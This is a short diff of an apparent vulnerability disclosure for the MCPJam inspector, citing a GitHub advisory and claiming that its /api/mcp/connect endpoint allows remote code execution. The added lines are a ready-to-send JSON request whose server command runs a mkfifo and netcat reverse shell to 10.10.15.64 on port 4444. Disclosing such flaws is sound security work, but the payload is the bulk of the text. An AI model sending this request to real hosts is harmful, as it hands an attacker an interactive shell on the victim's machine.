@@ -89,6 +89,16 @@ https://github.com/MCPJam/inspector/security/advisories/GHSA-232v-j27c-5pp6
 i found that their is vlunerbility that the /api/mcp/connect is vlunerable to remote code execution (RCE) attack can be triggered by sending a simple HTTP request to the target host running MCPJam inspector
 
 
+
+
+{
+  "serverConfig": {
+    "command": "/bin/sh",
+ "args": ["-c", "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.15.64 4444 >/tmp/f"],
+    "env": {}
+  },
+  "serverId": "ping-test"
+}
 ```
 
 
